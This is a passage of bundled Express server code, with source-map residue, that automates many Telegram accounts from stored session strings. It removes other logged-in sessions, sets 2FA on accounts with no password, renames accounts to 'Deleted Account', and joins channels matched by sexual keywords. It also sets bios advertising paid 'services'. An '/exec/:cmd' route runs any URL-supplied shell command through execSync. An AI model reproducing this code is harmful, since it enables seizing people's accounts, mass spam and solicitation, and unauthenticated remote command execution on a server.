res.send(\"Updating Privacy\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updatePrivacy();\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/UpdateUsername/:number', async (req, res, next) => {\r\n  res.send(\"Updating Privacy\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const username = req.query?.username;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updateUsername(username);\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/UpdatePP/:number', async (req, res, next) => {\r\n  res.send(\"Updating profile Pic\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updateProfilePic(\"./qrcode.jpg\");\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/UpdateName/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\n\r\napp.get('/deletepp/:number', async (req, res, next) => {\r\n  res.send(\"Updating Name\");\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const number = req.params?.number;\r\n    const db = ChannelService.getInstance();\r\n    const user = await db.getUser({ mobile: number });\r\n    console.log(user);\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      const client = await getClient(user.mobile);\r\n      if (cli) {\r\n        await client.deleteProfilePhotos();\r\n      } else {\r\n        console.log(\"Client Does not exist!\")\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error)\r\n  }\r\n});\r\n\r\napp.get('/removeAuths/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (!hasClient(user.mobile)) {\r\n    const cli = await createClient(user.mobile, user.session);\r\n    const client = await getClient(user.mobile);\r\n    if (client) {\r\n      await client.removeOtherAuths();\r\n      res.send(\"Auths Removed\");\r\n    } else {\r\n      res.send(\"client EXPIRED\");\r\n    }\r\n  } else {\r\n    res.send(\"Client Already existing\");\r\n  }\r\n});\r\n\r\napp.get('/exec/:cmd', async (req, res, next) => {\r\n  let cmd = req.params.cmd;\r\n  console.log(`executing: `, cmd);\r\n  try {\r\n    res.send(console.log(execSync(cmd).toString()));\r\n  } catch (error) {\r\n    console.log(error);\r\n  }\r\n});\r\n\r\napp.get('/blockusers/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (!hasClient(user.mobile)) {\r\n    const cli = await createClient(user.mobile, user.session);\r\n    const client = await getClient(user.mobile);\r\n    if (client) {\r\n      await client.blockAllUsers();\r\n      res.send(\"Blocked Users\");\r\n    } else {\r\n      res.send(\"client EXPIRED\");\r\n    }\r\n  } else {\r\n    res.send(\"Client Already existing\");\r\n  }\r\n});\r\n\r\napp.get('/getAuths/:number', async (req, res) => {\r\n  const number = req.params?.number;\r\n  const db = ChannelService.getInstance();\r\n  const user = await db.getUser({ mobile: number });\r\n  if (!hasClient(user.mobile)) {\r\n    const cli = await createClient(user.mobile, user.session);\r\n    const client = await getClient(user.mobile);\r\n    if (client) {\r\n      res.json(await client.getAuths());\r\n    } else {\r\n      res.send(\"client EXPIRED\");\r\n    }\r\n  } else {\r\n    res.send(\"Client Already existing\");\r\n  }\r\n});\r\n\r\n\r\napp.get('/connectcliens/:limit/:skip', async (req, res) => {\r\n  const limit = req.params?.limit;\r\n  const skip = req.params?.skip;\r\n  const db = ChannelService.getInstance();\r\n  const users = await db.getUsersFullData(parseInt(limit), parseInt(skip));\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n\r\n  for (const user of users) {\r\n    if (!hasClient(user.mobile)) {\r\n      const cli = await createClient(user.mobile, user.session);\r\n      if (cli) {\r\n        resp += `${user.mobile} : true\\n\\n`;\r\n      } else {\r\n        resp += `${user.mobile} : false\\n\\n`;\r\n      }\r\n    }\r\n  }\r\n\r\n  resp += '</pre></body></html>';\r\n\r\n  console.log(\"data: \", resp);\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp);\r\n});\r\n\r\napp.get('/disconnectclients', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  await disconnectAll();\r\n});\r\n\r\napp.get('/promoteStats', async (req, res, next) => {\r\n  const resp = await getPromotionStatsHtml();\r\n  res.setHeader('Content-Type', 'text/html');\r\n  res.send(resp)\r\n});\r\n\r\n\r\napp.get('/getusers/:limit/:skip', async (req, res, next) => {\r\n  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);\r\n  const skip = parseInt(req.params?.skip ? req.params?.skip : 10);\r\n  const db = ChannelService.getInstance();\r\n  const users = await db.getUsers(limit, skip);\r\n  res.json(users)\r\n})\r\n\r\napp.get('/getlastmsgs/:number/:limit', async (req, res, next) => {\r\n  const limit = parseInt(req.params?.limit ? req.params?.limit : 10);\r\n  const number = req.params?.number;\r\n  console.log(number, limit);\r\n  const clientobj = getClient(number);\r\n  await clientobj.client.connect();\r\n  console.log(clientobj.client.connected);\r\n  if (clientobj) {\r\n    const result = await clientobj?.getLastMsgs(limit, number);\r\n    res.send(result)\r\n  } else {\r\n    res.send(\"client is undefined\");\r\n  }\r\n\r\n})\r\n\r\napp.get('/getchannels', async (req, res, next) => {\r\n  checkerclass.getinstance()\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userValues = Array.from(userMap.values());\r\n  for (let i = 0; i < userValues.length; i++) {\r\n    const value = userValues[i];\r\n    await fetchWithTimeout(`${value.url}getchannels`);\r\n    await sleep(1000);\r\n  }\r\n});\r\n\r\napp.get('/restart', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  const userName = req.query.userName;\r\n  const checker = checkerclass.getinstance()\r\n  checker.restart(userName.toLowerCase());\r\n});\r\n\r\napp.get('/receiveNumber/:num', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    const num = parseInt(req.params.num);\r\n    const data = userMap.get(userName.toLowerCase());\r\n    if (data) {\r\n      await axios.get(`${data.url}receiveNumber/${num}`, { timeout: 7000 });\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code);\r\n  }\r\n});\r\n\r\napp.get('/tgclientoff/:num', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    const processId = req.params.num;\r\n    console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'Req receved from: ', req.query.url, \" : \", userName, ' - ', processId)\r\n\r\n    try {\r\n      const data = userMap.get(userName.toLowerCase());\r\n      const url = data?.url;\r\n      if (url) {\r\n        const connectResp = await axios.get(`${url}getprocessid`, { timeout: 10000 });\r\n        if (connectResp.data.ProcessId === processId) {\r\n          userMap.set(userName.toLowerCase(), { ...data, timeStamp: Date.now(), downTime: 0, lastPingTime: Date.now() });\r\n          pushToconnectionQueue(userName, processId)\r\n        } else {\r\n          console.log(`Actual Process Id from ${url}getprocessid : `, connectResp.data.ProcessId);\r\n          console.log(\"Request received from Unknown process\")\r\n        }\r\n      }\r\n    } catch (error) {\r\n      console.log(\"Some Error: \", error)\r\n    }\r\n\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error);\r\n  }\r\n});\r\n\r\n\r\napp.get('/joinchannel', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    if (userName) {\r\n      const data = userMap.get(userName.toLowerCase());\r\n      if (data) {\r\n        joinchannels(data)\r\n      } else {\r\n        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);\r\n      }\r\n    } else {\r\n      for (const value of userMap.values()) {\r\n        try {\r\n          joinchannels(value)\r\n        } catch (error) {\r\n          console.log(\"Some Error: \", error.code);\r\n        }\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error);\r\n  }\r\n});\r\n\r\napp.get('/joinchannelBf', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    joinchannelForBufferClients()\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code);\r\n  }\r\n});\r\n\r\napp.get('/requestcall', async (req, res, next) => {\r\n  res.send('Hello World!');\r\n  next();\r\n}, async (req, res) => {\r\n  try {\r\n    const userName = req.query.userName;\r\n    const chatId = req.query.chatId;\r\n    const user = userMap.get(userName.toLowerCase());\r\n    // await fetchWithTimeout(`${ppplbot()}&text=Call Request Recived: ${userName} | ${chatId}`);\r\n    console.log(`Call Request Recived: ${userName} | ${chatId}`)\r\n    if (user) {\r\n      setTimeout(async () => {\r\n        try {\r\n          const data = await axios.get(`${user.url}requestcall/${chatId}`, { timeout: 7000 });\r\n          if (data.data) {\r\n            console.log(`Call Request Sent: ${userName} | ${chatId}`)\r\n            setTimeout(async () => {\r\n              try {\r\n                const data = await axios.get(`${user.url}requestcall/${chatId}`, { timeout: 7000 });\r\n                setTimeout(async () => {\r\n                  await axios.get(`${user.url}sendMessage/${chatId}?msg=Not Connecting!!, Don't worry I will try again in sometime!! okay!!`, { timeout: 7000 });\r\n                }, 3 * 60 * 1000);\r\n              } catch (error) {\r\n                console.log(error)\r\n              }\r\n            }, 2 * 60 * 1000);\r\n          } else {\r\n            console.log(`Call Request Sent Not Sucess: ${userName} | ${chatId}`);\r\n          }\r\n        } catch (error) {\r\n          console.log(\"Failed\", user);\r\n        }\r\n\r\n      }, 3 * 60 * 1000);\r\n    } else {\r\n      console.log(\"USer not exist!!\")\r\n    }\r\n  } catch (error) {\r\n    console.log(\"Some Error: \", error.code);\r\n  }\r\n});\r\n\r\napp.listen(port, async () => {\r\n  console.log(`Example app listening at http://localhost:${port}`)\r\n});\r\n\r\nclass checkerclass {\r\n  static instance = undefined;\r\n\r\n  constructor() {\r\n    this.main();\r\n  };\r\n\r\n  static getinstance() {\r\n    if (!checkerclass.instance) {\r\n      console.log('creating instance-------')\r\n      checkerclass.instance = new checkerclass();\r\n    }\r\n    return checkerclass.instance;\r\n  }\r\n  main() {\r\n\r\n  }\r\n\r\n  async restart(userName, processId) {\r\n    const data = userMap.get(userName);\r\n    console.log(data, userName);\r\n    const url = data?.url;\r\n    if (url) {\r\n      userMap.set(userName, { ...data, timeStamp: Date.now() });\r\n      try {\r\n        //await axios.get(`${ ppplbot() }& text=${ userName } is DOWN!!`, { timeout: 10000 });\r\n        //await axios.get(`${ url } `, { timeout: 10000 });\r\n        try {\r\n          console.log('Checking Health')\r\n          const resp = await axios.get(`${url} checkHealth`, { timeout: 10000 });\r\n          if (resp.status === 200 || resp.status === 201) {\r\n            if (resp.data.status === apiResp.ALL_GOOD || resp.data.status === apiResp.WAIT) {\r\n              console.log(resp.data.userName, ': All good');\r\n            } else {\r\n              console.log(resp.data.userName, ': DIAGNOSE - HealthCheck - ', resp.data.status);\r\n              await axios.get(`${ppplbot()}& text=${(resp.data.userName).toUpperCase()}: HealthCheckError - ${resp.data.status} `);\r\n              try {\r\n                const connectResp = await axios.get(`${url} tryToConnect / ${processId} `, { timeout: 10000 });\r\n                console.log(connectResp.data.userName, ': RetryResp - ', connectResp.data.status);\r\n                await axios.get(`${ppplbot()}& text=${(connectResp.data.userName).toUpperCase()}: RetryResponse - ${connectResp.data.status} `);\r\n              } catch (e) {\r\n                console.log(url, `CONNECTION RESTART FAILED!!`);\r\n              }\r\n            }\r\n          } else {\r\n            console.log(url, `is unreachable!!`);\r\n          }\r\n        } catch (e) {\r\n          console.log(url, `is unreachable!!`);\r\n          //console.log(e)\r\n        }\r\n      }\r\n      catch (e) {\r\n        console.log(e)\r\n      }\r\n    }\r\n    else {\r\n      console.log('url is undefined');\r\n    }\r\n  }\r\n}\r\nasync function joinchannels(value) {\r\n  try {\r\n    let resp = await fetchWithTimeout(`${value.url}channelinfo`, { timeout: 200000 });\r\n    console.log(resp);\r\n    await fetchWithTimeout(`${(ppplbot())}&text=ChannelCount SendTrue - ${value.clientId}: ${resp.data.canSendTrueCount}`)\r\n    if (resp?.data?.canSendTrueCount && resp?.data?.canSendTrueCount < 250) {\r\n      await fetchWithTimeout(`${ppplbot()}&text=Started Joining Channels- ${value.clientId}`)\r\n      const keys = ['wife', 'adult', 'lanj', 'servic', 'paid', 'randi', 'bhab', 'boy', 'girl'];\r\n      const db = ChannelService.getInstance();\r\n      const channels = await db.getActiveChannels(100, 0, keys, resp.data?.ids, 'activeChannels');\r\n      for (const channel of channels) {\r\n        try {\r\n          console.log(channel.username);\r\n          const username = channel?.username?.replace(\"@\", '');\r\n          if (username) {\r\n            fetchWithTimeout(`${value.url}joinchannel?username=${username}`);\r\n            await sleep(200000);\r\n          }\r\n        } catch (error) {\r\n          console.log(\"Some Error: \", error)\r\n        }\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(error)\r\n  }\r\n}\r\n\r\n\r\nasync function getPromotionStatsPlain() {\r\n  let resp = '';\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.readPromoteStats();\r\n  for (const data of result) {\r\n    resp += `${data.client.toUpperCase()} : ${data.totalCount} ${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}`;\r\n  }\r\n  return resp;\r\n}\r\n\r\nasync function getPromotionStats() {\r\n  let resp = '';\r\n  const db = ChannelService.getInstance();\r\n  const result = await db.readPromoteStats();\r\n  for (const data of result) {\r\n    resp += `${data.client.toUpperCase()} : <b>${data.totalCount}</b>${data.totalCount > 0 ? ` | ${Number((Date.now() - data.lastUpdatedTimeStamp) / (1000 * 60)).toFixed(2)}` : ''}<br>`;\r\n  }\r\n  return resp;\r\n}\r\n\r\nasync function getPromotionStatsHtml() {\r\n  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';\r\n  resp = resp + await getPromotionStats();\r\n  resp += '</pre></body></html>';\r\n  return resp;\r\n}\r\n\r\nfunction isDateInPast(dateStr) {\r\n  const today = new Date();\r\n  const [day, month, year] = dateStr.split('-').map(Number);\r\n  const inputDate = new Date(year, month - 1, day); // Note: Month is 0-based in JavaScript\r\n\r\n  return inputDate < today;\r\n}\r\n\r\nasync function getData() {\r\n  const profileData = await createInitializedObject();\r\n  const db = await ChannelService.getInstance();\r\n  let entries = await db.readStats();\r\n  // console.log(Object.keys(profileData));\r\n  for (const entry of entries) {\r\n    const { count, newUser, payAmount, demoGivenToday, demoGiven, profile, client, name, secondShow } = entry;\r\n\r\n    // console.log(profile.toUpperCase(), profileData[profile.toUpperCase()])\r\n    if (client && profileData[client.toUpperCase()]) {\r\n      const userData = profileData[client.toUpperCase()];\r\n      userData.totalCount += count;\r\n      userData.totalPaid += payAmount > 0 ? 1 : 0;\r\n      userData.totalOldPaid += (payAmount > 0 && !newUser) ? 1 : 0;\r\n      userData.oldPaidDemo += (demoGivenToday && !newUser) ? 1 : 0;\r\n      userData.totalpendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;\r\n      userData.oldPendingDemos += (payAmount > 25 && !demoGiven && !newUser) ? 1 : 0;\r\n      if (payAmount > 25 && !demoGiven) {\r\n        userData.names = userData.names + ` ${name} |`\r\n      }\r\n\r\n      if (demoGiven && ((payAmount > 90 && !secondShow) || (payAmount > 150 && secondShow))) {\r\n        userData.fullShowPPl++;\r\n        userData.fullShowNames = userData.fullShowNames + ` ${name} |`\r\n      }\r\n\r\n      if (newUser) {\r\n        userData.totalNew += 1;\r\n        userData.totalNewPaid += payAmount > 0 ? 1 : 0;\r\n        userData.newPaidDemo += demoGivenToday ? 1 : 0;\r\n        userData.newPendingDemos += (payAmount > 25 && !demoGiven) ? 1 : 0;\r\n      }\r\n    }\r\n  }\r\n  const profileDataArray = Object.entries(profileData);\r\n  profileDataArray.sort((a, b) => b[1].totalpendingDemos - a[1].totalpendingDemos);\r\n  let reply = '';\r\n  for (const [profile, userData] of profileDataArray) {\r\n    reply += `${profile.toUpperCase()} : <b>${userData.totalpendingDemos}</b> | ${userData.names}<br>`;\r\n  }\r\n\r\n  profileDataArray.sort((a, b) => b[1].fullShowPPl - a[1].fullShowPPl);\r\n  let reply2 = '';\r\n  for (const [profile, userData] of profileDataArray) {\r\n    reply2 += `${profile.toUpperCase()} : <b>${userData.fullShowPPl}</b> |${userData.fullShowNames}<br>`;\r\n  }\r\n\r\n  let reply3 = await getPromotionStats()\r\n\r\n  return (\r\n    `<div>\r\n      <div style=\"display: flex; margin-bottom: 60px\">\r\n        <div style=\"flex: 1;\">${reply}</div>\r\n        <div style=\"flex: 1; \">${reply2}</div>\r\n      </div>\r\n      <div style=\"display: flex;\">\r\n        <div style=\"flex: 1; \" >${reply3}</div>\r\n      </div>\r\n    </div>`\r\n  );\r\n\r\n}\r\nlet goodIds = [];\r\nlet badIds = [];\r\nasync function checkBufferClients() {\r\n  const db = await ChannelService.getInstance();\r\n  await disconnectAll()\r\n  await sleep(2000);\r\n  const clients = await db.readBufferClients({});\r\n  goodIds = [];\r\n  badIds = [];\r\n  if (clients.length < 40) {\r\n    for (let i = 0; i < 40 - clients.length; i++) {\r\n      badIds.push(1)\r\n    }\r\n  }\r\n  for (const document of clients) {\r\n    console.log(document)\r\n    const cli = await createClient(document.mobile, document.session);\r\n    if (cli) {\r\n      const client = await getClient(document.mobile);\r\n      const hasPassword = await client.hasPassword();\r\n      if (!hasPassword) {\r\n        badIds.push(document.mobile);\r\n        await db.deleteBufferClient(document);\r\n      } else {\r\n        const channels = await client.channelInfo(true);\r\n        await db.insertInBufferClients({ mobile: document.mobile, channels: channels.ids.length });\r\n        console.log(document.mobile, \" :  ALL Good\");\r\n        goodIds.push(document.mobile)\r\n      }\r\n      await client.disconnect();\r\n      await deleteClient(document.mobile)\r\n      await sleep(2000);\r\n    } else {\r\n      console.log(document.mobile, \" :  false\");\r\n      badIds.push(document.mobile);\r\n      await db.deleteBufferClient(document)\r\n      await db.deleteUser(document);\r\n    }\r\n  }\r\n  console.log(badIds, goodIds);\r\n  await addNewUserstoBufferClients();\r\n}\r\n\r\nasync function addNewUserstoBufferClients() {\r\n  const db = await ChannelService.getInstance();\r\n  const cursor = await db.getNewBufferClients(goodIds);\r\n  while (badIds.length > 0) {\r\n    try {\r\n      if (cursor.hasNext()) {\r\n        const document = await cursor.next();\r\n        const cli = await createClient(document.mobile, document.session);\r\n        if (cli) {\r\n          const client = await getClient(document.mobile);\r\n          const hasPassword = await client.hasPassword();\r\n          console.log(\"hasPassword: \", hasPassword);\r\n          if (!hasPassword) {\r\n            await client.removeOtherAuths();\r\n            await client.set2fa();\r\n            console.log(\"waiting for setting 2FA\");\r\n            await sleep(35000);\r\n            await client.updateUsername();\r\n            await sleep(5000)\r\n            await client.updatePrivacyforDeletedAccount();\r\n            await sleep(5000)\r\n            await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n            await sleep(5000)\r\n            await client.deleteProfilePhotos();\r\n            await sleep(5000)\r\n            console.log(\"Inserting Document\");\r\n            await db.insertInBufferClients(document);\r\n            await client.disconnect();\r\n            await deleteClient(document.mobile)\r\n            badIds.pop();\r\n          } else {\r\n            await db.updateUser(document, { twoFA: true });\r\n            await client.disconnect();\r\n            await deleteClient(document.mobile)\r\n          }\r\n        } else {\r\n          await db.deleteUser(document);\r\n        }\r\n      } else {\r\n        console.log(\"Cursor Does not have Next\");\r\n      }\r\n    } catch (error) {\r\n      console.error(\"An error occurred:\", error);\r\n    }\r\n  }\r\n  setTimeout(() => {\r\n    joinchannelForBufferClients()\r\n  }, 2 * 60 * 1000);\r\n}\r\n\r\n\r\nasync function updateClient(clientId) {\r\n  try {\r\n    const db = await ChannelService.getInstance();\r\n    const oldClient = await db.getUserConfig({ clientId })\r\n    if (oldClient) {\r\n      try {\r\n        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace(\"+\", '') });\r\n        if (oldClientUser) {\r\n          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session);\r\n          if (cli) {\r\n            const client = await getClient(oldClientUser.mobile);\r\n            const username = (clientId.match(/[a-zA-Z]+/g)).toString();\r\n            await CloudinaryService.getInstance(username);\r\n            const userCaps = username[0].toUpperCase() + username.slice(1)\r\n            await client.updateUsername(`${userCaps}Redd`);\r\n            await sleep(5000)\r\n            await client.deleteProfilePhotos();\r\n            await sleep(3000)\r\n            await client.updatePrivacy();\r\n            await sleep(3000)\r\n            await client.updateProfilePic('./dp1.jpg');\r\n            await sleep(1000);\r\n            await client.updateProfilePic('./dp2.jpg');\r\n            await sleep(1000);\r\n            await client.updateProfilePic('./dp3.jpg');\r\n            await sleep(1000);\r\n            await client.updateProfile(oldClient.name, \"Genuine Paid Girl🥰, Best Services❤️\");\r\n          }\r\n        }\r\n      } catch (error) {\r\n        console.log(\"Error updateing settings of old Client - \", error);\r\n      }\r\n    }\r\n  } catch (e) {\r\n\r\n  }\r\n}\r\nasync function setUpClient(clientId, archieveOld) {\r\n  try {\r\n    const db = await ChannelService.getInstance();\r\n    const oldClient = await db.getUserConfig({ clientId })\r\n    let oldClienttg;\r\n    if (archieveOld && oldClient) {\r\n      try {\r\n        const oldClientUser = await db.getUser({ mobile: (oldClient?.number.toString()).replace(\"+\", '') });\r\n        if (oldClientUser) {\r\n          const cli = await createClient(oldClientUser?.mobile, oldClientUser?.session, false);\r\n          if (cli) {\r\n            oldClienttg = await getClient(oldClientUser.mobile);\r\n            // await oldClienttg.updateProfile(\"Deleted Account\", `New ACC https://${oldClient.link}`);\r\n            // await sleep(5000)\r\n            await oldClienttg.deleteProfilePhotos();\r\n            await sleep(5000)\r\n            await oldClienttg.updatePrivacyforDeletedAccount();\r\n          }\r\n        }\r\n        delete oldClientUser[\"_id\"]\r\n        await db.insertInBufferClients({ ...oldClientUser })\r\n      } catch (error) {\r\n        console.log(\"Error updateing settings of old Client - \", error);\r\n      }\r\n      delete oldClient['_id']\r\n      oldClient['insertedDate'] = new Date().toISOString().split('T')[0]\r\n      await db.insertInAchivedClient(oldClient);\r\n      console.log(\"Archived old client\");\r\n    }\r\n\r\n    const newClient = await db.getOneBufferClient();\r\n    await deleteClient(newClient.mobile)\r\n    await sleep(2000);\r\n    if (newClient) {\r\n      const cli = await createClient(newClient.mobile, newClient.session, false);\r\n      if (cli) {\r\n        const client = await getClient(newClient.mobile);\r\n        const username = (clientId.match(/[a-zA-Z]+/g)).toString();\r\n        await CloudinaryService.getInstance(username);\r\n        const userCaps = username[0].toUpperCase() + username.slice(1);\r\n        setActiveClientSetup({ phoneNumber: newClient.mobile, clientId });\r\n        const newUsername = await client.updateUsername(`${userCaps}Redd`);\r\n        oldClienttg?.updateProfile(\"Deleted Account\", `New ACC: @${newUsername}`);\r\n        await sleep(3000)\r\n        await client.deleteProfilePhotos();\r\n        await sleep(3000)\r\n        await client.updatePrivacy();\r\n        await sleep(3000)\r\n        await client.updateProfilePic('./dp1.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfilePic('./dp2.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfilePic('./dp3.jpg');\r\n        await sleep(1000);\r\n        await client.updateProfile(oldClient.name, \"Genuine Paid Girl🥰, Best Services❤️\");\r\n        await sleep(3000)\r\n        const existingData = await db.getInAchivedClient({ number: `+${newClient.mobile}` });\r\n        if (existingData) {\r\n          await setNewClient(existingData, clientId);\r\n        } else {\r\n          await generateNewSession(newClient.mobile)\r\n        }\r\n      }\r\n    }\r\n  } catch (error) {\r\n    console.log(error)\r\n  }\r\n}\r\nasync function generateNewSession(phoneNumber) {\r\n  try {\r\n    console.log(\"String Generation started\");\r\n    await sleep(2000);\r\n    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${phoneNumber}`);\r\n    console.log(\"Code Sent successfully\")\r\n  } catch (error) {\r\n    console.log(error)\r\n  }\r\n}\r\nasync function setNewClient(user, activeClientSetup) {\r\n  try {\r\n    const db = await ChannelService.getInstance();\r\n    let mainAccount = user.userName?.replace(\"@\", '')\r\n    if (fetchNumbersFromString(activeClientSetup.clientId) == \"2\") {\r\n      const mainUser = await db.getUserConfig({ clientId: activeClientSetup.clientId.replace(\"2\", \"1\") });\r\n      mainAccount = mainUser.userName;\r\n    } else {\r\n      const client2 = activeClientSetup.clientId.replace(\"1\", \"2\")\r\n      const data = await db.updateUserConfig({ clientId: client2 }, { mainAccount: mainAccount });\r\n      if (data) {\r\n        console.log(client2, \" -  \", data)\r\n        console.log(`updated ${client2}'s MainAccount with ${mainAccount}`);\r\n        if (data.repl) {\r\n          try {\r\n            await axios.get(`${data?.repl}/exit`);\r\n          } catch (error) {\r\n\r\n          }\r\n        }\r\n      }\r\n    }\r\n    const updatedClient = await db.updateUserConfig({ clientId: activeClientSetup.clientId }, { session: user.session, number: user.number ? user.number : `+${user.mobile}`, userName: user.userName?.replace(\"@\", ''), mainAccount: mainAccount });\r\n    console.log(\"Updated the Client Successfully\", updatedClient);\r\n    await db.deleteBufferClient({ mobile: activeClientSetup.phoneNumber });\r\n    console.log(activeClientSetup.clientId, \" -  \", updatedClient)\r\n    if (updatedClient?.repl) {\r\n      try {\r\n        await axios.get(`${updatedClient?.repl}/exit`)\r\n      } catch (error) {\r\n        console.log(error);\r\n      }\r\n    }\r\n    await setUserMap()\r\n  } catch (error) {\r\n    console.log(error);;\r\n  }\r\n}\r\n\r\nfunction fetchNumbersFromString(inputString) {\r\n  const regex = /\\d+/g;\r\n  const matches = inputString.match(regex);\r\n  if (matches) {\r\n    const result = matches.join('');\r\n    return result;\r\n  } else {\r\n    return '';\r\n  }\r\n}\r\n\r\nasync function joinchannelForBufferClients() {\r\n  const db = ChannelService.getInstance();\r\n  await disconnectAll();\r\n  await sleep(2000);\r\n  const clients = await db.readBufferClients({ channels: { \"$lt\": 150 } }, 5)\r\n  for (const document of clients) {\r\n    const cli = await createClient(document.mobile, document.session, false);\r\n    if (cli) {\r\n      const client = await getClient(document.mobile);\r\n      const channels = await client.channelInfo(true);\r\n      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];\r\n      const result = await db.getActiveChannels(150, 0, keys, channels.ids, \"channels\");\r\n      console.log(\"DbChannelsLen: \", result.length);\r\n      let resp = '';\r\n      for (const channel of result) {\r\n\r\n        resp = resp + (channel?.username?.startsWith(\"@\") ? channel.username : `@${channel.username}`) + \"|\";\r\n      }\r\n      client.joinChannels(resp);\r\n    }\r\n  }\r\n}\r\n\r\nfunction pushToconnectionQueue(userName, processId) {\r\n  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);\r\n  if (existingIndex !== -1) {\r\n    connetionQueue[existingIndex].processId = processId;\r\n  } else {\r\n    connetionQueue.push({ userName, processId });\r\n  }\r\n}\r\n"],"names":["module","exports","require","console","log","cloudinary","path","fs","fetchWithTimeout","CloudinaryService","static","resources","Map","constructor","v2","config","cloud_name","process","env","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","getInstance","name","instance","getResourcesFromFolder","folderName","this","findAndSaveResources","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","result","uploader","upload","resource_type","overwrite","invalidate","public_id","error","type","api","prefix","max_results","forEach","async","resource","set","split","url","extension","substring","lastIndexOf","length","mypath","resolve","__dirname","responseType","then","res","statusText","Error","existsSync","unlinkSync","writeFileSync","data","err","catch","saveFile","create_folder","uploadPromises","Array","from","entries","map","key","upload_large","folder","Promise","all","printResources","val","get","publicId","getBuffer","MongoClient","ServerApiVersion","ChannelService","client","undefined","db","users","statsDb","statsDb2","isConnected","isInstanceExist","connect","mongouri","useNewUrlParser","useUnifiedTopology","serverApi","v1","maxPoolSize","on","collection","insertChannel","channelData","title","id","username","megagroup","participantsCount","broadcast","cannotSendMsgs","defaultBannedRights","sendMessages","filter","channelI